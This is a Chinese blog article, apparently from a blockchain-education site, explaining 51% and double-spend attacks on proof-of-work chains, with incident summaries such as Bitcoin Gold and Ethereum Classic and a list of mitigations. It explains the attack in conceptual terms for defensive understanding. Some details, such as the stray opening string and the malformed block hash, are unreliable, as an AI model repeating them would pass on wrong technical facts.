000029329385BNDH749 比如比特币中区块高度为512884的区块的Hash为： 1000000000000000000188d44fd53064469b17c3590a0c4df8e90626d11e25a69 通过记账产生此区块的工作量证明为16**18次hash计算，这是一个非常大的计算量。 51%攻击通过简单介绍了通过记账来打包区块以及PoW的简单原理之后，回到我们的问题上来，什么是51%攻击，什么是双花攻击？ 双花攻击，简单来说就是指将一个代币通过多次支付手段发起的攻击，也就是指同一个货币被花费了多次。发起双花攻击的方式有很多，包括以下几种形式： 51%攻击 种族攻击 Vector 76 攻击 替代历史攻击 也就是说如果攻击者掌握了全网超过50%的计算能力时，可通过51%攻击实施双花。 这里我们只分析51%攻击过程。 51%攻击，又被称为Majority attack。这种攻击是通过控制网络算力实现双花。如果攻击者控制了网络中50%以上的算力，那么在他控制算力的这段时间，他可以将区块逆转，进行反向交易，实现双花。 在PoW共识协议里，区块链系统同时允许存在多条分叉链，而每一条链都可以对外申明自己是正确的，但是在区块链的设计理念中有一个最长有效原理：“不论在什么时候，最长的链会被认为是拥有最多工作的主链。” 下面我们简单模拟一下51%的攻击过程： 如果存在这样一个攻击者，它刻意把第一笔交易向一半网络进行广播，把第二笔交易向另一半网络广播，然后两边正好有两个矿工几乎同时取得记账权，把各自记账的block广播给大家，此时选择任意一个账本都可以，这时候原来统一的账本出现了分叉，如下图： 接下来，下一个矿工选择在A基础上继续记账的话，A分支就会比B分支更长，根据区块链的规则，最长的分支会被认可，短的分支会被放弃，账本还是会回归为一个，交易也只有一笔有效，如下图： 此时A分支被认可，相应交易确认，如果攻击者拿到商品之后，立刻自己变身矿工，争取到连续两次记账权，然后在B分支上联系增加两个block，如下图所示： 于是B分支成为认可的分支，此时A分支被舍弃，A分支中的交易不再成立，攻击者在A分支的支付货币重新有效，但攻击者已经拿到商品，至此成功完成一次双花攻击。问题了，在B分支落后的情况下要强行让它超过A分支，现实中难度很大，成功的概率很低，但是，攻击者如果掌握了全网50%以上的计算力，那么，即使落后很多，他追上也只是时间问题，这就是上面所说的“51%攻击”。 比特币黄金51%攻击案例分析在区块链的现实世界里发送过很多次因为51%攻击导致的双花。 比如比特币黄金Bitcoin Gold (BTG币) 发生的双花问题就属于51%攻击，攻击过程如下： 攻击者控制 Bitcoin Gold网络上51%以上的算力，在控制算力的期间，他把一定数量的 BTG 发给自己在交易所的钱包，这条分支我们命名为分支A。 同时，他又把这些 BTG 发给另一个自己控制的钱包，这条分支我们命名为分支B。 分支A 上的交易被确认后，攻击者立马卖掉BTG，拿到现金。这时候，分支A成为主链。 然后，攻击者在分支B 上进行挖矿，由于其控制了51%以上的算力，那么攻击者获得记账权的概率很大，于是很快分支B 的长度就超过了主链(也就是分支A 的长度)，那么分支B 就会成为主链，分支A 上的交易就会被回滚，将数据恢复到上一次正确的状态位置。 也就是说，分支A 恢复到攻击者发起第一笔交易之前的状态，攻击者之前换成现金的那些BTG 又回到了自己手里。 最后，攻击者把这些BTG，发到自己的另一个钱包。就这样，攻击者凭借51%以上的算力控制，实现同一笔token 的“双花”。 据此次攻击区块链数据报道，攻击者成功逆转了22个区块，涉及此次攻击的比特币黄金地址已收到超过388200个 BTG，假设所有这些交易都与双花相关，攻击者可能已经从交易所窃取了价值高达1860万美元的资金，涉及此次攻击的比特币黄金记录如下图所示： 除了Bitcoin Gold 发生的双花问题之外，还有很多由于51%攻击导致的双花攻击案例： 匿名数字货币verge曾在短短几个小时内恶意挖掘了超过3500万个XVG，价值约175万美元。 日本加密货币monacoin在一名矿工获得高达57％的网络算力后明显遭到扣块攻击。 莱特币现金（LCC）官方消息，LCC曾遭到了51%攻击。 数字货币ZEN也遭受到了51%攻击。 近日以太坊经典ETC遭受51%攻击。 来说说近日以太坊经典ETC的51%攻击，据区块链安全情报显示，一个地址以0x3ccc8f74开头的私人矿池算力发生了较大波动，这个私人矿池的算力目前占比ETC整个网络算力的63%。也就是说，该矿池目前控制ETC网络的大部分算力，这是51％攻击的先决条件。针对此次攻击的分析见coinbase的文章。 文章说在1 月 5 号监测到第 1 次双花攻击，之后又发现了 8 次双花攻击，总共涉及到 88,500 枚 ETC (约$460,000)，但是文章中未说明这次双花攻击的目标是谁，以及是谁发起了这次双花攻击。 总结根据以往发生的51%攻击案例，51% 攻击一旦成为真实场景下的成熟攻击方法，各个公链都需要小心，虽然通过51%攻击需要很大代价，但是在小币种公链网络中呢？况且，即使没有50%以上的算力，依然还是有机会成功的，只是概率低而已。 无论工作量证明的PoW，还是权益证明PoS，还是委托权益证明DPoS，只要在共识问题里面，理论上讲都无法避免出现 51% 攻击情况，在不同共识机制的实现中还可能存在各种其他问题，而且在熊市的这段时间里，算力下降，币价大跌，主网相对更加脆弱的，更容易出现51%攻击问题。 针对51%攻击的解决方案主要有如下几种： 提高确认次数。比如近日的以太坊经典ETC 51%攻击中建议将确认次数提高为 500 个以上。 在共识机制方面改善。比如 当时莱特币LCC受到51% 攻击之后官方表示引入PoS机制。 升级新的算法。比如Bitcoin Gold遭受51%攻击之后表示，将开发新的 PoW 算法以替代原有的 Equihash 算法。 与交易所实时沟通信息对称。比如Bitcoin Gold遭受51%攻击之后立即与合作交易所合作，阻断黑客的套现渠道。 通过第三方专业区块链安全团队应急处理。 本文由深入浅出区块链社区合作伙伴-零时科技安全团队提供。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>共识安全</tag>
        <tag>51%攻击</tag>
      </tags>
  </entry>
</search>
